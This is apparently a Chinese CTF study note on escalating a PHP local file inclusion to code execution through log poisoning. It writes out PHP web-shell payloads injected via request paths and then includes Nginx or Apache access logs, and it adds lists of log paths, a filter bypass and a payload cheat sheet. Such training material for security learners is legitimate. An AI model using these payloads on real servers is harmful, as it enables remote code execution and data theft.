## 一句话概括

当 `php://` 和 `data://` 都被过滤、服务器上又没有可上传的点位时，还有一招：**先想办法把 PHP 代码写进日志文件，再 `include` 这个日志文件**。日志的内容和路径都可控，这就是「日志投毒」。

## 原理

### 1. 日志投毒为什么可行

它只需要同时满足两个条件，而这两个条件在文件包含场景里**天然就成立**：

**① 我们能够控制日志内容**

访问一个 URL 时，完整的请求行会被写进访问日志。请求行里的**路径部分是我们自己填的**：

```text
访问： http://靶机地址/<?php system("cat /flag");?>

日志中记录：
"GET /<?php system("cat /flag");?> HTTP/1.1" 404 123 ...
```

于是，我们提交的这段 PHP 代码被**原样写进了日志文件**。日志里出现 `<?php ... ?>` 等价于「服务器上凭空多了一个内容可控的文件」。

**② 日志文件可以被包含**

日志文件本身是服务器上的**真实路径**（如 `/var/log/nginx/access.log`），`include` 它和 include 其他本地文件没有区别。当 PHP 读到日志里的 `<?php ... ?>`，就会把这段代码执行掉。

```text
用户请求恶意 URL（路径里带 PHP 代码）
        ↓
Web 服务器把这一行写进 access.log
        ↓
攻击者 include 该日志文件路径
        ↓
PHP 读到日志里的 <?php ... ?> 并执行
        ↓
拿到命令执行结果 → 读 flag
```

**一句话**：日志投毒 = 用「访问日志」当免费的、可控内容的文件，把「写」和「包含」两步拼起来。

### 2. 为什么它常出现在「`php` 与 `data` 都被过滤之后」

典型的题目前置过滤长这样：

```php
$file = $_GET['file'];
$file = str_replace("php", "???", $file);    // 禁掉 php:// 系列
$file = str_replace("data", "???", $file);   // 再禁掉 data://
include($file);
```

- `php://filter` 和 `php://input` 被 `php` 关键词卡死；
- `data://` 被 `data` 关键词卡死；
- 但 `/var/log/nginx/access.log` 里**既没有 `php` 也没有 `data`** —— 过滤规则完全不拦它。

于是日志包含就成了这条链上的下一个自然选择。它还有一个好处：**包含的不是「我们上传的文件」，而是服务器自己写的文件**，绕过了所有基于「上传点」的检测。

## 利用条件

1. **有文件包含点**，且过滤规则没覆盖日志路径（不能过滤 `log` 之类）；
2. **知道日志文件的真实路径**（或用下面的方法试出来）；
3. **日志内容可控**：请求行 / User-Agent / Referer 等字段会写进日志，任选其一；
4. **日志文件进程可读**：日志权限通常是 640 / 644，Web 用户能否读要看配置，`Permission denied` 就是读不了。

## 完整示例

**步骤 1：污染日志**

在 URL 路径里带上 PHP 代码（也可以用 User-Agent，见备注）：

```http
GET /<?php system("tac /flag");?> HTTP/1.1
Host: 靶机地址
```

对应的日志里会出现近似这样一行：

```text
"GET /<?php system("tac /flag");?> HTTP/1.1" 404 123
```

**步骤 2：包含日志文件**

```http
GET /?file=/var/log/nginx/access.log HTTP/1.1
Host: 靶机地址
```

**步骤 3：代码执行**

服务器把日志当 PHP 读，遇到 `<?php system("tac /flag");?>` 就执行 —— 命令的输出会出现在页面返回里。

> 实操提示：如果日志里同一行同时出现多个双引号（比如 `User-Agent` 里也有引号），容易把 PHP 语法搞坏。**最稳的写法是让代码自成一段、不含会与日志格式冲突的引号**，例如用 `$_GET` 传参：日志里只留 `<?php system($_GET[1]);?>`，实际命令从 `?1=id` 传进去。

## 常见日志路径

不同 Web 服务器 / 系统的日志路径不同，逐个试：

**Nginx：**

```text
/var/log/nginx/access.log
/usr/local/nginx/logs/access.log
/etc/nginx/logs/access.log
```

**Apache：**

```text
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/httpd/access.log
/usr/local/apache/logs/access_log
```

如果连日志路径都不确定，可以先用 LFI 读 `/etc/nginx/nginx.conf`、`/etc/apache2/apache2.conf`、`/etc/httpd/conf/httpd.conf` 之类的配置文件（路径遍历已在 `01-信息收集\目录遍历.md` 中详述），从里面找到 `access_log` 的配置值。

## 探测方法

**方法 1：直接试常见路径**

```text
?file=/var/log/nginx/access.log
?file=/var/log/apache2/access.log
?file=/var/log/httpd/access.log
```

**方法 2：靠错误信息判断**

包含失败时的报错很有信息量（前提是 `display_errors` 开着）：

| 报错 | 含义 |
|---|---|
| `No such file or directory` | 路径不对，文件不存在 |
| `Permission denied` | 文件存在，但 Web 进程没权限读 |
| 无报错但页面没变化 | 包含成功，只是日志里还没有我们的代码（先去污染再回来） |

**方法 3：先污染，再包含**

顺序很重要 —— 日志是「先有请求才有一行」。**先发一次带 PHP 代码的请求，再去包含日志**，否则包含到的永远是还没有 payload 的老日志。

## 其他「无文件包含」思路

日志不是唯一的内容可控文件。同一条思路上还可以考虑（具体可用性取决于环境）：

| 目标 | 为什么可控 | 备注 |
|---|---|---|
| `/proc/self/environ` | 环境变量可经 `User-Agent` 等注入（老环境） | 现代 PHP-FPM 下通常不可控 |
| PHP Session 文件 `/tmp/sess_<PHPSESSID>` | session 值写进文件，且 ID 我们可控 | 需知道 session 存储路径 |
| `/var/log/auth.log`、`/var/log/secure` | SSH 爆破时用户名会进日志 | 需要能触发 SSH 登录尝试 |
| `/var/log/mail.log` | 邮件头可控 | 需服务器有邮件服务 |
| `/proc/self/fd/<n>` | 指向进程当前打开的文件描述符 | 见 `06-文件读取\文件描述符fd与内核结构.md` |

## Payload 速查

| 目的 | Payload |
|---|---|
| 污染日志（路径里带代码） | `GET /<?php system($_GET[1]);?> HTTP/1.1` 然后 `?1=id` |
| 包含 Nginx 日志 | `?file=/var/log/nginx/access.log` |
| 包含 Apache 日志 | `?file=/var/log/apache2/access.log` |
| 包含 SSH 日志 | `?file=/var/log/auth.log` |
| 包含 session 文件 | `?file=/tmp/sess_<你的PHPSESSID>` |

## 踩坑与备注

- **顺序不能反**：必须「先污染、后包含」。反过来包含到的是没有 payload 的旧日志，会误判成「日志包含不可用」。
- **引号是最大的坑**：日志本身用引号包裹请求行，payload 里再出现双引号容易把代码截断。优先用 `$_GET[...]` / `$_REQUEST[...]` 把参数放到 URL 上，日志里只留最简结构。
- **日志可能很大**：几万行的日志会让页面返回巨大且夹着 payload 难找。可以用 `?file=...` 配合 `php://filter` 之类的过滤器做变形，或直接 `grep` 式地多次包含 / 用回显定位。
- **`Permission denied` 不是坏事**：它说明路径猜对了，只是权限不够 —— 换一条日志路径继续试，或者改用 `/proc/self/environ` 这类进程自身的文件。
- **该思路同样适用于 `access_log` 被改名的情况**：先去读 `nginx.conf` / `httpd.conf` 拿到实际配置的日志路径。
